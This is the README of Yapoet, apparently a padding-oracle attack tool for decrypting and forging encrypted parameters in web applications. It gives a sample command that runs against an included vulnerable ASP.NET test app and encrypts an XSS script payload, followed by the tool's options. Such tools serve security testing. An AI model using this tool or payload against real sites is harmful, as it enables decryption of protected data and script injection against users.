Yapoet
======

Comprehensive description will be added later. Presently you can try to play with it against included example of a vulnerable web application:
```
\Examples\ASP.NET-Webforms\BuildAndRun.cmd
python yapoet.py -u http://localhost:8080/ -d "aEMei5bwchHQqb6rh17Irg==" -e "<script>alert(/XSS/)</script>" --data="__VIEWSTATE=&Answer=&EncryptedAnswer=%encrypted_data%"
```

Usage
=====
    yapoet.py [options]
    
    Options:
      -h, --help            show this help message and exit
      -u URL, --url=URL     Target URL (e.g. "http://host/?param1=value%2b1&param2=value%2b2")
      -d ENCRYPTED_DATA, --decrypt=ENCRYPTED_DATA
                            Base64-encoded data to decrypt
      -e PLAINTEXT_DATA, --encrypt=PLAINTEXT_DATA
                            Plaintext data to encrypt
      --data=POST_DATA      POST data (e.g. "param1=value%2b1&param2=value%2b1")
      --cookie=COOKIE       HTTP Cookie header value
      --block-size=BLOCK_SIZE
                            Cipher block size [default: 16]
    
    Please note that the value of at least one of the HTTP-request parameters in the URL, 
    POST_DATA or COOKIE options should be replaced with an %encrypted_data% placeholder.
